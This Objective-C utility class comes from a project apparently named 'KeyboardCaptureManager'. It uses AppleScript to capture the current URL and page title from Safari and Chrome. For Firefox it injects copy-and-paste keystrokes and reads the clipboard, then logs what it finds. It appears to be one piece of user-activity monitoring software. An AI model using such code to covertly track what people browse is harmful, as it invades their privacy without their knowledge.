//
//  UrlUtils.m
//  KeyboardCaptureManager
//
//  Created by Ophat Phuetkasickonphasutha on 9/30/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "UrlUtils.h"


@implementation UrlUtils

static UrlUtils *_UrlUtils=nil;

+(id)shareInstance{
    if (_UrlUtils==nil) {
        _UrlUtils = [[UrlUtils alloc]init];
    }
    return _UrlUtils;
}

+(NSArray *)lastUrlAndTitle:(NSString *)aAppName{
    NSString* url=@"";
    NSString* title=@"";
    
    if ([aAppName isEqualToString:@"Safari"]) {
        DLog(@"Safari visited");
        NSAppleScript *scpt=[[NSAppleScript alloc]initWithSource:@"tell application \"Safari\" \n return{ URL of current tab of window 1,name of current tab of window 1} \n end tell"];
        NSAppleEventDescriptor *scptResult=[scpt executeAndReturnError:nil];
        
        url=[[scptResult descriptorAtIndex:1]stringValue];
        title=[[scptResult descriptorAtIndex:2]stringValue];
 
        [scpt release];
    }else if ([aAppName isEqualToString:@"Google Chrome"]) {
        DLog(@"Google Chrome visited");
        NSAppleScript *scpt=[[NSAppleScript alloc]initWithSource:@"tell application \"Google Chrome\" to return {URL of active tab of front window, title of active tab of front window}"];
        NSAppleEventDescriptor *scptResult=[scpt executeAndReturnError:nil];
        
        url=[[scptResult descriptorAtIndex:1]stringValue];
        title=[[scptResult descriptorAtIndex:2]stringValue];
        
        [scpt release];
    } else if ([aAppName isEqualToString:@"Firefox"]) {
        DLog(@"Firefox visited");
        NSAppleScript *scpt=[[NSAppleScript alloc]initWithSource:@"tell application \"System Events\" \n keystroke \"l\" using command down \n keystroke \"c\" using command down \n keystroke \"v\" using command down \n keystroke tab \n keystroke tab \n end tell \n return the clipboard"];
        NSAppleEventDescriptor *scptResult=[scpt executeAndReturnError:nil];
        
        url=[scptResult stringValue];
        title=@"Unknown"; // Cannot get title;
        
        [scpt release];
    } 

    DLog(@"url %@",url);
    DLog(@"title %@",title);
    NSArray * returnVale = [[NSArray alloc]initWithObjects:url,title, nil];
    return [returnVale autorelease];
}



- (void)dealloc
{
    [super dealloc];
}

@end
